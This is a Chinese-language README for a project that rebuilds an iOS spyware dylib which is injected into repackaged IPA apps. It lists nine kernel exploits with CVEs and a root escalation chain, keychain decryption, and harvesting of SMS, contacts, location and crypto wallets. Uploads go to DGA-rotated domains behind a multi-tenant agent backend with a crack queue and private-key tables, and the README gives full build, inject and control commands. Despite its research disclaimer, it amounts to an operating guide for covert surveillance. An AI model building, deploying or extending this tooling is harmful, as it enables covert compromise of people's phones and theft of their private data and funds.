# libappcore-reverse

> libappcore.dylib 完整逆向工程与复刻项目

基于注入到 iOS IPA 中的 `libappcore.dylib`（1.6MB 移动取证代理端）进行完整逆向分析，还原其源代码、通信协议、漏洞利用链和后台控制系统。

## 项目架构

```
libappcore-reverse/
├── src/                    # C++/ObjC 源代码 (iOS dylib)
│   ├── autorun.mm          # 自动运行入口
│   ├── server/             # TCP 控制服务器
│   ├── acquisition/        # 数据采集 (文件系统/钥匙串/元数据)
│   ├── exploit/            # 漏洞利用 (9种策略)
│   ├── kernel/             # 内核读写原语
│   ├── permissions/        # 权限提升 (ucred/MacDirtyCow)
│   └── keychain/           # AKS 钥匙串解密
├── include/                # 头文件 (20个)
├── server/                 # 多租户远程接收服务器 (Python/Flask)
│   ├── appcore_server.py   # 核心服务端
│   ├── database.py         # 数据库模型 (8表)
│   ├── auth.py             # JWT 认证 + 权限隔离
│   └── admin-web/          # 代理后台 (Vue3 + ElementPlus)
├── controller/             # 电脑端 TCP 控制软件
├── scripts/                # 工具脚本
│   ├── inject_dylib.py     # IPA 注入脚本
│   └── localize_admin_deps.py  # 后台依赖本地化
├── tests/                  # 单元测试
├── entitlements.plist      # iOS 权限模板
├── CMakeLists.txt          # iOS 编译配置
├── BUILD.md                # 完整部署与使用指南
├── PROTOCOL.md             # 通信协议文档
└── REVERSE_ENGINEERING_REPORT.md  # 逆向分析报告
```

## 核心能力

### 设备端 (libappcore.dylib)
- **9种内核漏洞利用策略**: sock_port, time_waste, MacDirtyCow, cicuta_virosa, Fugu15, dangling_join, street_race, busy_schedule, darkSword
- **后利用框架**: 内核泄露 → 伪造端口 → 内核读写 → tfp0 → ucred 提权 → root，支持运行时偏移校准
- **数据采集**: 文件系统 (tar.gz), 钥匙串 (AKS 硬件解密+缓存), 元数据, 备忘录, 短信, 通讯录, 位置, 加密货币钱包
- **双通道架构**: 本地 TCP 服务器 (端口1337) + 远程 HTTP 上传
- **自动运行**: 注入后随宿主 App 启动自动执行
- **DGA 域名**: MonthlyCycleDGA 按月轮换上传域名

### 服务端 (多租户代理后台)
- **多租户体系**: 管理员 + 渠道代理, 数据按渠道隔离
- **8张数据表**: users, channels, devices, files, keychain_items, crack_queue, private_keys, token_transfers
- **JWT 认证**: 角色权限隔离 (admin/agent)
- **设备管理**: 设备列表, 文件统计, 破解队列
- **安全加固**: 速率限制 (60s/100req), 文件大小限制 (500MB), 安全响应头

### 控制端 (电脑端)
- TCP 连接设备, 发送命令获取数据
- 支持 filesystem/keychain/metadata/status/version/upload/memo/sms/contacts 等命令

## 快速开始

### 1. 启动服务器
```bash
cd server
pip install -r requirements.txt
python appcore_server.py -p 8080
# 访问 http://localhost:8080/
# 默认管理员: admin / admin123
```

### 2. 编译 iOS dylib (需 macOS + Xcode)
```bash
# 安装依赖
brew install libarchive sqlite3

# 配置 CMake (需 ios.toolchain.cmake)
cmake -B build -G Xcode -DCMAKE_TOOLCHAIN_FILE=ios.toolchain.cmake -DPLATFORM=OS64

# 编译
cmake --build build --config Release

# 签名 (需 entitlements)
codesign -f -s "iPhone Developer" --entitlements entitlements.plist build/Release-iphoneos/libappcore.dylib
```

### 3. 注入到 IPA
```bash
python scripts/inject_dylib.py input.ipa output.ipa --dylib build/Release-iphoneos/libappcore.dylib
```

### 4. 电脑端控制
```bash
cd controller
python appcore_controller.py <device_ip> 1337
```

### 5. 运行测试
```bash
python -m pytest tests/ -v
```

## 漏洞利用覆盖

| 策略 | CVE | iOS 版本 | 状态 |
|------|-----|----------|------|
| sock_port | CVE-2019-8605 | 12-13 | 完整实现 |
| time_waste | CVE-2021-30955 | 14.0-15.1 | 完整实现 |
| MacDirtyCow | CVE-2022-46689 | <16.2 | 完整实现 |
| cicuta_virosa | CVE-2021-1782 | 14.0-14.3 | 核心原语 |
| Fugu15/madvm | - | 15-16 | 核心原语 |
| dangling_join | - | 14-16 | 核心原语 |
| street_race | - | 13-15 | 核心原语 |
| busy_schedule | - | 14-15 | 核心原语 |
| darkSword | CVE-2025-43510 | 16 | 核心原语 |

## 钥匙串解密

两层解密流程:
1. **AKS 层**: AppleKeyStore IOKit (selector 0xB KeyUnwrap) → class_key
2. **AES 层**: RFC 3394 Key Unwrap → per_row_key → AES-256-GCM 解密

支持钥匙串版本: V3, V5, V6, V7 (NSKeyedArchiver bplist), V8, V9, V11
解密结果自动缓存, 数据库未修改时直接返回缓存。

## 文档

- [BUILD.md](BUILD.md) - 完整部署与使用指南
- [PROTOCOL.md](PROTOCOL.md) - TCP/HTTP 通信协议 (含 upload 命令)
- [REVERSE_ENGINEERING_REPORT.md](REVERSE_ENGINEERING_REPORT.md) - 逆向分析报告
- [OPEN_SOURCE_REFERENCES.md](OPEN_SOURCE_REFERENCES.md) - 开源参考项目

## 技术栈

- **设备端**: C++17, Objective-C++, iOS SDK, CommonCrypto, IOKit, libarchive, SQLite3
- **服务端**: Python 3, Flask, SQLite, JWT
- **前端**: Vue 3, Element Plus (支持离线本地化)
- **构建**: CMake + Xcode (iOS), ios.toolchain.cmake
- **CI**: GitHub Actions (Python 测试 + 结构检查)

## 开源参考

- [jakeajames/sock_port](https://github.com/jakeajames/sock_port) - sock_port/time_waste 利用 (MIT)
- [Apple XNU](https://github.com/apple-oss-distributions/xnu) - MacDirtyCow 测试用例
- [nabla-c0d3/iphone-dataprotection](https://github.com/nabla-c0d3/iphone-dataprotection) - 钥匙串解密 (MIT)
- [Dopamine/libjailbreak](https://github.com/opa334/Dopamine) - 偏移表参考

## 许可证

本项目仅供安全研究和授权测试使用。集成的 cicuta_virosa 组件为 GPL-3.0，其余部分为 MIT。

## 免责声明

本项目仅用于安全研究、教育目的和授权的渗透测试。未经授权对他人设备进行数据提取是违法行为。使用者需自行承担使用本项目的所有法律责任。
